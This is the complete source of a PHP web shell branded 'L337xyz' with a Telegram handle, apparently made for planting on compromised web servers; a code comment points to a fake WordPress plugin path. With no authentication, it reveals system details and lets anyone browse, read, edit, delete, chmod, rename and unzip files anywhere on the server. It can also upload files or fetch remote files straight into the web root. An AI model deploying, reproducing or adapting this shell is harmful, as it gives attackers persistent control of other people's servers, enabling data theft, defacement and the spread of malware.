<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>L337xyz</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg-color: #0a0a0a;
            --text-color: #00ff00;
            --accent-color: #00cc00;
            --border-color: #004400;
            --hover-bg: #002200;
            --input-bg: #111;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            background-color: var(--bg-color);
            color: var(--text-color);
            line-height: 1.6;
            font-size: 14px;
            min-height: 100vh;
        }

        a {
            color: var(--text-color);
            text-decoration: none;
            transition: all 0.3s ease;
        }

        a:hover {
            color: #fff;
            text-shadow: 0 0 5px var(--text-color);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            margin-bottom: 30px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 20px;
        }

        .title {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 20px;
            text-shadow: 0 0 10px var(--accent-color);
            letter-spacing: 2px;
        }

        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            font-size: 13px;
            background: #111;
            padding: 15px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
        }

        .info-line {
            display: flex;
            gap: 10px;
        }

        .info-label {
            color: #666;
            min-width: 80px;
        }

        .info-value {
            color: #fff;
            word-break: break-all;
        }

        .breadcrumb {
            background: #111;
            padding: 15px;
            border-radius: 4px;
            border: 1px solid var(--border-color);
            margin-bottom: 20px;
            word-wrap: break-word;
        }

        .upload-section {
            background: #111;
            padding: 20px;
            border-radius: 4px;
            border: 1px solid var(--border-color);
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
            color: #fff;
            border-left: 3px solid var(--accent-color);
            padding-left: 10px;
        }

        .form-row {
            margin-bottom: 15px;
        }

        .radio-group {
            display: flex;
            gap: 20px;
            margin-bottom: 15px;
        }

        .radio-item {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }

        input[type="text"], 
        input[type="password"],
        textarea,
        select {
            background: var(--input-bg);
            border: 1px solid var(--border-color);
            color: var(--text-color);
            padding: 8px 12px;
            border-radius: 4px;
            font-family: inherit;
            width: 100%;
        }

        input[type="text"]:focus,
        textarea:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.2);
        }

        .btn {
            background: var(--border-color);
            color: #fff;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-family: inherit;
            transition: all 0.3s;
            text-transform: uppercase;
            font-weight: bold;
            font-size: 12px;
        }

        .btn:hover {
            background: var(--accent-color);
            box-shadow: 0 0 10px var(--accent-color);
            color: #000;
        }

        .upload-row {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .file-table {
            overflow-x: auto;
            border: 1px solid var(--border-color);
            border-radius: 4px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }

        th {
            background: #1a1a1a;
            padding: 12px 15px;
            text-align: left;
            font-weight: 600;
            color: #fff;
            border-bottom: 1px solid var(--border-color);
        }

        td {
            padding: 10px 15px;
            border-bottom: 1px solid #222;
        }

        tr:hover {
            background: var(--hover-bg);
        }

        .file-link {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .dir-link {
            color: #fff;
            font-weight: bold;
        }

        .size {
            color: #888;
            font-family: monospace;
        }

        .writable { color: var(--accent-color); font-weight: bold; }
        .readonly { color: #ff4444; }

        .action-form {
            display: flex;
            gap: 5px;
        }

        .action-form select {
            width: auto;
            min-width: 80px;
            padding: 4px;
        }

        .footer {
            margin-top: 50px;
            text-align: center;
            border-top: 1px solid var(--border-color);
            padding-top: 20px;
            color: #666;
        }
        
        /* Custom Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-color);
        }
    
        /* Message / Toast Notification */
        .message {
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            animation: fadeIn 0.5s ease-in-out;
        }

        .message-success {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border: 1px solid #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }

        .message-error {
            background: rgba(255, 0, 0, 0.1);
            color: #ff4444;
            border: 1px solid #ff4444;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

    </style>

</head>
<body>
    <div class="container">
        <div class="header">
            <div class="title">L337xyz</div>
            
            <?php
            session_start();
            set_time_limit(0);
            error_reporting(0);

            $disfunc = @ini_get("disable_functions");
            if (empty($disfunc)) {
                $disf = "<span class='writable'>NONE</span>";
            } else {
                $disf = "<span class='readonly'>".$disfunc."</span>";
            }

            // --- FUNCTIONS ---
            function unzip_file($file, $dest) {
                $zip = new ZipArchive;
                if ($zip->open($file) === TRUE) {
                    $zip->extractTo($dest);
                    $zip->close();
                    return true;
                } else {
                    return false;
                }
            }
            
            function author() {
                echo '<div class="footer">
                        <a href="https://t.me/L337xyz" class="telegram-link" target="_blank">
                            <span>@</span><span>L337xyz</span>
                        </a>
                      </div>';
                exit();
            }

            function cekdir() {
                if (isset($_GET['path'])) {
                    $lokasi = $_GET['path'];
                } else {
                    $lokasi = getcwd();
                }
                if (is_writable($lokasi)) {
                    return "<span class='writable'>writable</span>";
                } else {
                    return "<span class='readonly'>readonly</span>";
                }
            }

            function cekroot() {
                if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                    return "<span class='writable'>writable</span>";
                } else {
                    return "<span class='readonly'>readonly</span>";
                }
            }

            function xrmdir($dir) {
                $items = scandir($dir);
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') {
                        continue;
                    }
                    $path = $dir.'/'.$item;
                    if (is_dir($path)) {
                        xrmdir($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dir);
            }

            function green($text) {
                echo "<div class='message message-success'>".$text."</div>";
            }

            function red($text) {
                echo "<div class='message message-error'>".$text."</div>";
            }
            
            function statusnya($file){
                $statusnya = fileperms($file);

                if (($statusnya & 0xC000) == 0xC000) {
                    $ingfo = 's';
                } elseif (($statusnya & 0xA000) == 0xA000) {
                    $ingfo = 'l';
                } elseif (($statusnya & 0x8000) == 0x8000) {
                    $ingfo = '-';
                } elseif (($statusnya & 0x6000) == 0x6000) {
                    $ingfo = 'b';
                } elseif (($statusnya & 0x4000) == 0x4000) {
                    $ingfo = 'd';
                } elseif (($statusnya & 0x2000) == 0x2000) {
                    $ingfo = 'c';
                } elseif (($statusnya & 0x1000) == 0x1000) {
                    $ingfo = 'p';
                } else {
                    $ingfo = 'u';
                }

                $ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
                $ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
                $ingfo .= (($statusnya & 0x0040) ?
                    (($statusnya & 0x0800) ? 's' : 'x' ) :
                    (($statusnya & 0x0800) ? 'S' : '-'));

                $ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
                $ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
                $ingfo .= (($statusnya & 0x0008) ?
                    (($statusnya & 0x0400) ? 's' : 'x' ) :
                    (($statusnya & 0x0400) ? 'S' : '-'));

                $ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
                $ingfo .= (($statusnya & 0x0002) ? 'w' : '-');
                $ingfo .= (($statusnya & 0x0001) ?
                    (($statusnya & 0x0200) ? 't' : 'x' ) :
                    (($statusnya & 0x0200) ? 'T' : '-'));

                return $ingfo;
            }

            // --- URL HELPER FUNCTION ---
            function get_web_url($file_path) {
                // Get the current script's web path (e.g. /wp-content/plugins/wp-cache-sys/index.php)
                $script_name = $_SERVER['SCRIPT_NAME'];
                $script_dir = dirname($script_name);
                
                // Get the current script's physical path (e.g. /home/user/public_html/wp-content/plugins/wp-cache-sys)
                $script_phys_dir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_FILENAME']));
                
                // Normalize file path
                $file_path = str_replace('\\', '/', $file_path);
                
                // Calculate relative path from script directory to file
                if (strpos($file_path, $script_phys_dir) === 0) {
                    // File is inside or below the script directory
                    $rel_path = substr($file_path, strlen($script_phys_dir));
                    return "http://" . $_SERVER['HTTP_HOST'] . $script_dir . $rel_path;
                } else {
                    // Fallback for files outside (Addon Domain Logic)
                    // If document root is /home/user/public_html but file is /home/user/addon.com/file.php
                    // We try to guess the domain based on path segments
                    $doc_root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
                    if (strpos($file_path, $doc_root) === 0) {
                        return "http://" . $_SERVER['HTTP_HOST'] . substr($file_path, strlen($doc_root));
                    }
                    
                    // Addon Domain Heuristic: 
                    // If path is /home/user/domain.com/file.php, url might be http://domain.com/file.php
                    $parts = explode('/', $file_path);
                    foreach ($parts as $i => $part) {
                        if (strpos($part, '.') !== false && $i > 2) { // crude check for domain in path
                             // This is very guess-heavy, safer to just link relative to current shell if possible
                        }
                    }
                    
                    // Safest fallback: relative link from current directory
                    return basename($file_path); 
                }
            }
            
            // --- PATH DETERMINATION ---
            foreach($_POST as $key => $value){
                $_POST[$key] = stripslashes($value);
            }
            if(isset($_GET['path'])){
                $lokasi = $_GET['path'];
            } else {
                $lokasi = getcwd();
            }
            $lokasi = str_replace('\\','/',$lokasi);

            // --- ACTION HANDLERS (MOVED TO TOP FOR AUTO-REFRESH) ---
            $msg = "";
            
            // Upload
            if (isset($_POST['upwkwk'])) {
                if (isset($_POST['berkasnya'])) {
                    if ($_POST['dirnya'] == "2") {
                        $lokasi = $_SERVER['DOCUMENT_ROOT'];
                    }
                    $target_file = $lokasi."/".$_FILES['berkas']['name'];
                    if (move_uploaded_file($_FILES['berkas']['tmp_name'], $target_file)) {
                         // Build Web URL for Open Link
                         $openurl = get_web_url($target_file);
                         $msg = "<div class='message message-success'>File uploaded: ".$_FILES['berkas']['name']." <a href='$openurl' target='_blank' style='margin-left:10px; color:#fff; text-decoration:underline;'>OPEN 🔗</a></div>";
                    } else {
                        $msg = "<div class='message message-error'>Upload failed</div>";
                    }
                } elseif (isset($_POST['linknya'])) {
                    if (empty($_POST['namalink'])) {
                        $msg = "<div class='message message-error'>Filename cannot be empty</div>";
                    } else {
                        if ($_POST['dirnya'] == "2") {
                            $lokasi = $_SERVER['DOCUMENT_ROOT'];
                        }
                        $target_file = $lokasi."/".$_POST['namalink'];
                        if (file_put_contents($target_file, @file_get_contents($_POST['darilink']))) {
                             $openurl = get_web_url($target_file);
                             $msg = "<div class='message message-success'>File fetched: ".$_POST['namalink']." <a href='$openurl' target='_blank' style='margin-left:10px; color:#fff; text-decoration:underline;'>OPEN 🔗</a></div>";
                        } else {
                            $msg = "<div class='message message-error'>Fetch failed</div>";
                        }
                    }
                }
            }
            
            // Create File/Folder
            if (isset($_POST['buatfile'])) {
                $namafile = $_POST['namafile'];
                if (empty($namafile)) {
                    $msg = "<div class='message message-error'>Filename cannot be empty</div>";
                } else {
                    if (file_exists($lokasi."/".$namafile)) {
                        $msg = "<div class='message message-error'>File already exists</div>";
                    } else {
                        if (file_put_contents($lokasi."/".$namafile, "") !== false) {
                            $msg = "<div class='message message-success'>File created: ".$namafile."</div>";
                        } else {
                            $msg = "<div class='message message-error'>Failed to create file</div>";
                        }
                    }
                }
            } elseif (isset($_POST['buatdir'])) {
                $namadir = $_POST['namadir'];
                if (empty($namadir)) {
                    $msg = "<div class='message message-error'>Foldername cannot be empty</div>";
                } else {
                    if (file_exists($lokasi."/".$namadir)) {
                        $msg = "<div class='message message-error'>Folder already exists</div>";
                    } else {
                        if (mkdir($lokasi."/".$namadir)) {
                            $msg = "<div class='message message-success'>Folder created: ".$namadir."</div>";
                        } else {
                            $msg = "<div class='message message-error'>Failed to create folder</div>";
                        }
                    }
                }
            }
            
            // Actions (Delete, Rename, Chmod, Unzip, Copy)
            if (isset($_POST['pilih'])) {
                $target = $_POST['path'];
                
                if ($_POST['pilih'] == "hapus") {
                    if (is_dir($target)) {
                        xrmdir($target);
                        if (!file_exists($target)) $msg = "<div class='message message-success'>Directory deleted</div>";
                        else $msg = "<div class='message message-error'>Failed to delete directory</div>";
                    } elseif (is_file($target)) {
                        @unlink($target);
                        if (!file_exists($target)) $msg = "<div class='message message-success'>File deleted</div>";
                        else $msg = "<div class='message message-error'>Failed to delete file</div>";
                    }
                } elseif ($_POST['pilih'] == "unzip") {
                    if (unzip_file($target, dirname($target))) {
                        $msg = "<div class='message message-success'>Unzipped successfully</div>";
                    } else {
                        $msg = "<div class='message message-error'>Unzip failed</div>";
                    }
                } elseif ($_POST['pilih'] == "copy") {
                    $_SESSION['copypath'] = $target;
                    $msg = "<div class='message message-success'>Copied to clipboard: " . basename($target) . "</div>";
                }
            }
            
            // Paste
            if (isset($_POST['paste_now']) && isset($_SESSION['copypath'])) {
                $source = $_SESSION['copypath'];
                $dest = $lokasi . '/' . basename($source);
                if (copy($source, $dest)) {
                    $msg = "<div class='message message-success'>Pasted: " . basename($source) . "</div>";
                } else {
                    $msg = "<div class='message message-error'>Paste failed</div>";
                }
            }
            
            // Edit/Rename/Chmod Logic (Needs UI, so handled separately in body but processing logic here if submitted)
            if (isset($_POST['gasedit'])) {
                 $edit = @file_put_contents($_POST['path'], $_POST['src']);
                 if ($edit) $msg = "<div class='message message-success'>File saved</div>";
                 else $msg = "<div class='message message-error'>Save failed</div>";
            }
            if (isset($_POST['chm0d'])) {
                $cm = @chmod($_POST['path'], $_POST['perm']);
                if ($cm) $msg = "<div class='message message-success'>Permission changed</div>";
                else $msg = "<div class='message message-error'>Permission change failed</div>";
            }
            if (isset($_POST['gantin'])) {
                $ren = @rename($_POST['path'], $_POST['newname']);
                if ($ren) $msg = "<div class='message message-success'>Renamed successfully</div>";
                else $msg = "<div class='message message-error'>Rename failed</div>";
            }

            // --- END ACTION HANDLERS ---

            ?>

            <div class="system-info">
                <div class="info-line">
                    <span class="info-label">Server:</span>
                    <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">System:</span>
                    <span class="info-value"><?php echo php_uname(); ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">User:</span>
                    <span class="info-value"><?php echo @get_current_user()." (".@getmyuid().")"; ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">PHP:</span>
                    <span class="info-value"><?php echo @phpversion(); ?></span>
                </div>
                <div class="info-line" style="grid-column: 1 / -1;">
                    <span class="info-label">Disabled:</span>
                    <span class="info-value"><?php echo $disf; ?></span>
                </div>
            </div>
        </div>

        <?php echo $msg; ?>

        <div class="breadcrumb">
            <?php
            $lokasis = explode('/',$lokasi);
            $lokasinya = @scandir($lokasi);

            echo "$ pwd: ";
            foreach($lokasis as $id => $lok){
                if($lok == '' && $id == 0){
                    $a = true;
                    echo '<a href="?path=/">/</a>';
                    continue;
                }
                if($lok == '') continue;
                echo '<a href="?path=';
                for($i=0;$i<=$id;$i++){
                    echo "$lokasis[$i]";
                    if($i != $id) echo "/";
                } 
                echo '">'.$lok.'</a>/';
            }
            
            if(isset($_SESSION['copypath'])) {
                echo " <span style='float:right; color:#00cc00; font-size:12px;'>📋 " . basename($_SESSION['copypath']) . " 
                <form method='post' style='display:inline;'>
                    <button type='submit' name='paste_now' class='btn' style='padding:2px 8px; font-size:10px;'>PASTE</button>
                </form></span>";
            }
            ?>
        </div>
        <div class="upload-section">
            <div class="section-title">Upload Files</div>
            <form enctype="multipart/form-data" method="post">
                <div class="form-row">
                    <div class="radio-group">
                        <label class="radio-item">
                            <input type="radio" value="1" name="dirnya" checked>
                            <span>current [<?php echo cekdir(); ?>]</span>
                        </label>
                        <label class="radio-item">
                            <input type="radio" value="2" name="dirnya">
                            <span>docroot [<?php echo cekroot(); ?>]</span>
                        </label>
                    </div>
                </div>

                <input type="hidden" name="upwkwk" value="aplod">
                
                <div class="form-row">
                    <div class="upload-row">
                        <input type="file" name="berkas">
                        <button type="submit" name="berkasnya" class="btn btn-primary">Upload</button>
                    </div>
                </div>

                <div class="form-row">
                    <div class="upload-row">
                        <input type="text" name="darilink" placeholder="https://example.com/file.txt">
                        <input type="text" name="namalink" placeholder="filename">
                        <button type="submit" name="linknya" class="btn btn-primary">Fetch</button>
                    </div>
                </div>

                <div class="form-row">
                    <div class="upload-row">
                        <input type="text" name="namafile" placeholder="New File Name">
                        <button type="submit" name="buatfile" class="btn btn-primary">Create File</button>
                        <input type="text" name="namadir" placeholder="New Folder Name">
                        <button type="submit" name="buatdir" class="btn btn-primary">Create Folder</button>
                    </div>
                </div>
            </form>
        </div>

        <?php
        if (isset($_GET['fileloc'])) {
            echo "<div class='file-preview'>";
            echo "<div class='section-title'>File: ".$_GET['fileloc']."</div>";
            echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
            echo "</div>";
            author();
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
            echo "<div class='edit-form'>";
            echo "<div class='section-title'>chmod ".$_POST['path']."</div>";
            echo '<form method="post">
            <div class="form-row">
                <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" placeholder="0644" />
                <input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="ubahmod">
                <button type="submit" name="chm0d" class="btn btn-primary">Apply</button>
            </div>
            </form>';
            echo "</div>";
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
            if (empty($_POST['name'])) {
                $namaawal = $_POST['newname'];
            } else {
                $namawal = $_POST['name'];
            }
            echo "<div class='edit-form'>";
            echo "<div class='section-title'>mv ".$_POST['path']."</div>";
            echo '<form method="post">
            <div class="form-row">
                <input name="newname" type="text" value="'.$namaawal.'" placeholder="new name" />
                <input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="gantinama">
                <button type="submit" name="gantin" class="btn btn-primary">Rename</button>
            </div>
            </form>';
            echo "</div>";
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
            echo "<div class='edit-form'>";
            echo "<div class='section-title'>nano ".$_POST['path']."</div>";
            echo '<form method="post">
            <textarea name="src" style="height:400px;">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
            <div class="form-row">
                <input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="edit">
                <button type="submit" name="gasedit" class="btn btn-primary">Save</button>
            </div>
            </form>';
            echo "</div>";
        }
        ?>
        <div class="file-table">
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th style="width: 80px;">Size</th>
                        <th style="width: 100px;">Permissions</th>
                        <th style="width: 160px;">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    if(is_array($lokasinya)){
                    foreach($lokasinya as $dir){
                        if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
                        echo "<tr>
                        <td>
                            <a href=\"?path=".$lokasi."/".$dir."\" class='file-link dir-link'>
                                📁 ".$dir."
                            </a>
                        </td>
                        <td class='size'>--</td>
                        <td class='permissions ";
                        if(is_writable($lokasi."/".$dir)) echo 'writable';
                        elseif(!is_readable($lokasi."/".$dir)) echo 'readonly';
                        echo "'>".statusnya($lokasi."/".$dir)."</td>
                        <td>
                            <form method='POST' action='?pilihan&path=$lokasi' class='action-form'>
                                <select name='pilih'>
                                    <option value=''>--</option>
                                    <option value='hapus'>rm</option>
                                    <option value='ubahmod'>chmod</option>
                                    <option value='gantinama'>mv</option>
                                    <option value='copy'>copy</option>
                                </select>
                                <input type='hidden' name='type' value='dir'>
                                <input type='hidden' name='name' value='$dir'>
                                <input type='hidden' name='path' value='$lokasi/$dir'>
                                <button type='submit' class='btn'>go</button>
                            </form>
                        </td>
                        </tr>";
                    }

                    foreach($lokasinya as $file) {
                        if(!is_file("$lokasi/$file")) continue;
                        $size = filesize("$lokasi/$file")/1024;
                        $size = round($size,3);
                        if($size >= 1024){
                            $size = round($size/1024,2).'M';
                        } else {
                            $size = $size.'K';
                        }
                        
                        // Construct direct web link
                        $openurl = get_web_url($lokasi.'/'.$file);

                        echo "<tr>
                        <td>
                            <a href=\"?fileloc=$lokasi/$file&path=$lokasi\" class='file-link'>
                                📄 $file
                            </a>
                        </td>
                        <td class='size'>".$size."</td>
                        <td class='permissions ";
                        if(is_writable("$lokasi/$file")) echo 'writable';
                        elseif(!is_readable("$lokasi/$file")) echo 'readonly';
                        echo "'>".statusnya("$lokasi/$file")."</td>
                        <td>
                            <div style='display:flex; gap:5px;'>
                                <a href='$openurl' target='_blank' class='btn' style='padding:4px 8px; text-decoration:none;' title='Open in new tab'>🔗</a>
                                <form method='post' action='?pilihan&path=$lokasi' class='action-form'>
                                    <select name='pilih' style='width:60px;'>
                                        <option value=''>--</option>
                                        <option value='hapus'>rm</option>
                                        <option value='ubahmod'>chmod</option>
                                        <option value='gantinama'>mv</option>
                                        <option value='edit'>nano</option>
                                        <option value='unzip'>unzip</option>
                                        <option value='copy'>copy</option>
                                    </select>
                                    <input type='hidden' name='type' value='file'>
                                    <input type='hidden' name='name' value='$file'>
                                    <input type='hidden' name='path' value='$lokasi/$file'>
                                    <button type='submit' class='btn'>go</button>
                                </form>
                            </div>
                        </td>
                        </tr>";
                    }
                    }
                    ?>
                </tbody>
            </table>
        </div>

        <?php
        author();
        ?>
    </div>
</body>
</html>
